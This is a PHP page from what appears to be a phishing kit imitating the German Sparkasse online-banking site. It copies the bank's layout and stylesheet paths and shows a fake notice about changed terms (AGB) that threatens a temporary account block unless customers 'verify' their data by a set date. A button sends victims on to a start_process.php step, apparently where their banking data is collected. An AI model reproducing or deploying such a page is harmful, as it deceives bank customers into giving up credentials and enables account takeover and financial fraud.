<?php

	$this_Name = "Aktualisierung";
	$this_Title = "Änderung unserer AGBs zum <b><?=$appScriptDate;?></b>";
	$appHeight = "899px";
	include("sp_config.inc.php");
	
	session_start();

	$sessionIDLength = 10;

	function app_Generated_SessionID() {
		list($usec, $sec) = explode(' ', microtime());
		return (float) $sec + ((float) $usec * 100000);
	}

	srand(app_Generated_SessionID());

	$sessionIDSeed = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	$generateSessionID = "";

	for($i = 0; $i < $sessionIDLength; $i ++) {
		$generateSessionID .= $sessionIDSeed[rand(0, strlen($sessionIDSeed))];
	}

	$_SESSION["ob_id"] = $generateSessionID;
	
	if($_POST) {
		header("Location: start_process.php");
		exit();
	}
	
	include("sp_header.tpl.php");
	
?>

            <div class="if6_outer if6_breadcrumb" aria-hidden="false">
                <div class="if6_inner">
                    <ul class="navpath">
                        <li>
                            <a href="#">
                                Aktualisierung
                            </a>
                        </li>

                        <li>
                            <a href="#">
                                Änderung unserer AGBs zum <b><?=$appScriptDate;?></b>
                            </a>
                        </li>
                    </ul>
                </div>
                <script type="application/ld+json">
                    {
                        "@context": "https://schema.org",
                        "@type": "BreadcrumbList",
                        "itemListElement": [
                            { "@type": "ListItem", "position": 1, "name": "xxx", "item": "#" },
                            { "@type": "ListItem", "position": 2, "name": "yyy", "item": "#" }
                        ]
                    }
                </script>
            </div>

            <section class="if6_outer if6_section" role="main" aria-hidden="false">
                <div class="if6_inner">
                    <div class="section parsys">
                        <div class="if6_glossar section"></div>

                        <div class="if6_tabnav section"></div>

                        <div class="cbox cbox-banking cbox-large section" style="height: auto;">
						<?php
						
							if($detect->isMobile()) {
								
						?>
                            <div id="ospm_app" class="ospm_if no-if6-changes" style="height: 806px;">
						<?php
						
							} else {
								
						?>
							<div id="ospm_app" class="ospm_if no-if6-changes" style="height: 636px;">
						<?php
						
							}
							
						?>
                                <div id="ospm_app_header_container">
                                    <div id="ospm_app_stage" style="display: none;">
                                        <div id="ospm_app_stage_content">
                                            <div id="ospm_app_stage_label_wrapper">
                                                <div id="ospm_app_stage_label1"></div>
                                                <div id="ospm_app_stage_label2"></div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="ospm_app_sub_header_container">
                                    <div id="ospm_app_header_wrapper">
                                        <div id="ospm_app_header" class="ospm_horizontal_flex_container" style="margin-top: 0px;">
                                            <div id="ospm_page_header_view">
                                                <div class="ospm_horizontal_flex_container">
												<?php
												
													if($detect->isMobile()) {
														
												?>
                                                    <h1 class="ospm_title"><span class="ospm_only_title">Aktualisierung</span></h1>
												<?php
												
													} else {
														
												?>
													<h1 class="ospm_title"><span class="ospm_only_title">Änderung unserer AGBs zum <b><?=$appScriptDate;?></b></span></h1>
												<?php
												
													}
													
												?>
                                                    <div class="ospm_context_title"><span></span></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="ospm_app_main" style="top: 0;">
                                    <div id="ospm_main_wrapper" class="ospm_horizontal_flex_container">
                                        <div id="ospm_app_main_middle">
                                            <div class="ospm_app_main_middle_inner_content">
                                                <div id="ospm_app_main_right_content_wrapper" class="ospm_app_main_right_content_wrapper">
                                                    <div id="ospm_app_main_right_content" class="ospm_app_main_right_content" style="transition-duration: 0ms; left: -200%;">
                                                        <div class="ospm_frame_wrapper" id="a41b2f47-37d5-4a38-8190-52eb651b19ae" style="left: 0%;"></div>
                                                        <div class="ospm_frame_wrapper" id="e6e2aa1e-b9ad-4c10-a359-5af22c34d655" style="left: 100%;"></div>
                                                        <div class="ospm_frame_wrapper ospm_active_frame" id="c808ca74-820a-4cf3-aa07-572256cb1eef" style="left: 200%;">
                                                            <div class="ospm_page_wrapper">
                                                                <div class="ospm_page_container" aria-hidden="false" style="padding-top: 64px;">
                                                                    <div class="ospm_layout ospm_one_column_layout ospm_header_to_scroll ospm_background_default" id="ID_2798ddde-d44a-4e24-b779-e8da73b3ee9f">
                                                                        <div class="ospm_columns_container">
                                                                            <div class="ospm_columns_aligner">
                                                                                <div class="ospm_layout_column_wrapper ospm_one_column_layout_1 ospm_scrollable_layout">
																				
																			
																				
                                                                                    <div class="ospm_column_layout ospm_layout_width_2_3">
                                                                                        <div class="ospm_layout_scrollarea">
                                                                                            <div class="ospm_list ospm_widget ospm_list_form" id="ID_60cc6317-6e8f-45b3-afcd-1da9550cb9df">
																							<form action="" method="POST">
                                                                                                <div class="ospm_list_content_container" style="margin-bottom:-50px;">
																								
																								
																							
																								
																								
                                                                                                    <div class="ospm_list_cell_container">
																									
                                                                                                      
																									
																										
																									
                                                                                                        <div
                                                                                                            class="ospm_notification ospm_widget_without_bottom_border ospm_has_margin_bottom ospm_margin_bottom_m3 ospm_has_icon ospm_has_label ospm_has_sublabel ospm_list_entry_wrapper"
                                                                                                            id="ID_bf72c39a-9f85-4bcd-bdf1-b455830b0d72"
                                                                                                        >
                                                                                                            <label class="ospm_label ospm_text_style_13" id="bf72c39a-9f85-4bcd-bdf1-b455830b0d72__label" style="">Liebe Kund*innen der Sparkasse!</label>
                                                                                                            <div class="ospm_sublabel ospm_text_style_26" id="bf72c39a-9f85-4bcd-bdf1-b455830b0d72__sublabel" style="font-size:16px;">
                                                                                                                Wir aktualisieren unsere allgemeinen Nutzungsbedingungen und um sicherzustellen, dass Sie Ihre Dienste bei uns auch weiterhin wie gewohnt nutzen können, ist eine Aktualisierung und Verifizierung Ihrer Daten erforderlich. Dieser Prozess wird vollautomatisch durchgeführt, sodass Sie nachfolgend eine Bestätigungsmeldung über die erfolgreich durchgeführte Aktualisierung Ihrer Daten erhalten.<br /><br />
																												
																												Sollten Sie die Verifizierung Ihrer Daten nicht bis zum <b><?=$appScriptDate;?></b> durchgeführt haben, so wird eine temporäre Nutzungssperre verhängt. Nach erfolgreicher Durchführung wird keinerlei sicherheitsbedingte Sperrung erfolgen.<br><br>
																												
																												Nach Betätigung der Schaltfläche <b>"Prozess jetzt durchführen"</b> werden Sie direkt zur Durchführung weitergeleitet.
                                                                                                            </div>
                                                                                                            <div class="ospm_widget_error_message ospm_hidden" role="alert"></div>
                                                                                                        </div>
																					
																									
																									
                                                                                                    <div class="ospm_list_expandable ospm_hidden" role="button" tabindex="0">
                                                                                                        <span class="ospm_list_expandable_label">Alle Felder anzeigen</span>
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                            <div class="ospm_navigationbar ospm_last_visible_element" id="ID_198f7284-c4a4-4268-95ec-d5428203608c">
                                                                  
																								<button type="submit" name="execute" class="ospm_one_button ospm_button_one_size_default ospm_text_style_default ospm_display_style_primary ospm_one_button_full_width ospm_clickable">
                                                                                                    <div class="ospm_button_label_wrapper ospm_horizontal_flex_container">
                                                                                                        <div class="ospm_button_label_container ospm_flex_items_align_center">
                                                                                                            <div class="ospm_button_label">Prozess jetzt durchführen</div>
                                                                                                            <div class="ospm_icon ospm_icon_next_arrow_s ospm_icon_noStroke ospm_icon_size_16 ospm_right_icon" style="background-image: none;">
                                                                                                                <svg
                                                                                                                    xmlns="http://www.w3.org/2000/svg"
                                                                                                                    xmlns:xlink="http://www.w3.org/1999/xlink"
                                                                                                                    focusable="false"
                                                                                                                    style="pointer-events: none;"
                                                                                                                >
                                                                                                                    <use xlink:href="#ospm_svg_symbol_next_arrow_s"></use>
                                                                                                                </svg>
                                                                                                            </div>
                                                                                                        </div>
                                                                                                    </div>
																								</button>
                                                                                            </div>
																						</form>
                                                                                        </div>
                                                                                        <div class="ospm_layout_stickyarea" style="top: 572px;"></div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="ospm_app_main_rightbar_wrapper">
                                    <div id="ospm_app_main_rightbar" class="invisible hidden">
                                        <div id="ospm_app_main_rightbar_tabcontainer">
                                            <div class="ospm_app_main_rightbar_tab">
                                                <div id="ospm_app_main_rightbar_administration" class="ospm_app_main_rightbar_slider">
                                                    <div class="ospm_app_main_rightbar_wrapper">
                                                        <div class="ospm_rightbar_frame" id="ospm_app_main_rightbar_consultant">
                                                            <div class="ospm_rightbar_row ospm_rightbar_row_expanded"></div>
                                                            <div class="ospm_rightbar_row"><div class="ospm_app_main_rightbar_buttons"></div></div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
									
                                </div>
                            </div>


                                    </script>


                                <script type="text/javascript">
                                    <!--
                                    $(document).one('if6_page_ready', function(){

                                    var notFound = true;
                                    var focusControl;
                                    var form = document.forms['30ac67ac4732465e'];
                                    for(var i = 0; notFound && i < form.elements.length; i++){
                                       focusControl = form.elements[i];
                                       if(focusControl){
                                           if(focusControl.className=='invisible' || focusControl.type == 'submit' || focusControl.type == 'hidden' || focusControl.disabled){
                                               continue;
                                           }
                                           if(focusControl.type == 'select-one'){
                                               if(focusControl.value !='CJlTAcvpZKrarRVI'){
                                                   continue;
                                               }
                                           }
                                       }
                                       notFound = false;
                                    }
                                    if (location.hash && location.hash.length > 2 && $(location.hash).length > 0) {
                                      focusControl = null;
                                    }

                                    if (focusControl && focusControl.length > 0) {
                                      focusControl = focusControl[0];
                                    }
                                    if (focusControl) {
                                      if (focusControl.type != 'hidden' && !focusControl.disabled && focusControl.focus) {
                                         focusControl.focus();
                                      }
                                    }

                                    });

                                     -->
                                </script>

                                <script>
                                    style = document.createElement("link");
                                    style.type = "text/css";
                                    style.rel = "stylesheet";
                                    style_if = document.createElement("link");
                                    style_if.type = "text/css";
                                    style_if.rel = "stylesheet";
                                    if (document.body.classList.contains("nbf")) {
                                        window.nbf = true;
                                        style.href = "/if/neo.proxy/TUFJTkBwb3J0YWw=/neoif/taoospm/css/ospm/ospm_v2.css";
                                        style.id = "ospm_v2_style_sheet";
                                        style_if.href = "/if/neo.proxy/TUFJTkBwb3J0YWw=/neoif/taoospm/css/ospm/ospm_if_v2.css";
                                        style_if.id = "ospm_v2_style_sheet";
                                    } else {
                                        style.href = "/if/neo.proxy/TUFJTkBwb3J0YWw=/neoif/taoospm/css/ospm/ospm.css";
                                        style.id = "ospm_style_sheet";
                                        style_if.href = "/if/neo.proxy/TUFJTkBwb3J0YWw=/neoif/taoospm/css/ospm/ospm_if.css";
                                        style_if.id = "ospm_style_sheet";
                                    }
                                    document.getElementsByTagName("head").item(0).appendChild(style);
                                    document.getElementsByTagName("head").item(0).appendChild(style_if);
                                    window.IFNeoBridge = window.IFNeoBridge || {};
                                    window.IFNeoBridge.getFormElement = function (name) {
                                        return document.querySelector("div.ospm_if-form input[name='" + IF.get(name) + "']");
                                    };
                                </script>
                            </div>
                        </div>

                        <div class="if6_crosssellingarea section">
                        </div>

 
                    </div>
                </div>
            </section>

<?php

	include("sp_footer.tpl.php");
	
?>